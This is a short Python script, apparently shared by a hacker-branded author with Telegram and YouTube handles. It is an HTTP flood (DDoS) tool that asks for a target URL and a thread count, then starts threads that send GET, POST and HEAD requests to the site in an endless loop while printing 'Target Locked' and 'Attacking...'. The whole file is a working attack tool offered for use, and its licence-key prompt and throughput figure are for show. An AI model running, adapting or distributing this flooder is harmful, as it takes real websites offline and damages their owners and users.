#created by Parmar Brand 1337
#My Telegram+Youtube  @ANONYMOUS_PK 
#2nd Tlgrm @YOUR_ANON_ONE

from colorama import init, Fore, Back, Style
import requests
import time
import threading
import os 
import random

init(autoreset=True)
red = Fore.RED
green = Fore.GREEN
cyan = Fore.CYAN
magenta = Fore.MAGENTA
yellow = Fore.YELLOW

os.system("clear")

    
def ddos():
    while 1:
        try:      
            res = requests.get(url)
            rep = requests.post(url)
            rep = requests.head(url)
            print(green + f"[+] Request Sent  Successfully!\n")
           

        except requests.exceptions.ConnectionError:
            print(red + "[+] Request was not sent\n")
        
           
key = input(yellow + f"Enter Licence key : ")

print(cyan + f"Well Come ")

url = input(green + f"Site Url =:")

print(cyan + f"Target Locked !!\n")

thn = input(yellow + f"Threads Amount:")

print(yellow + f" Rps : 5.91 Mbps "
"   Attacking...")

for i in range(int(thn)):
    thr = threading.Thread(target=ddos)
    thr.start()
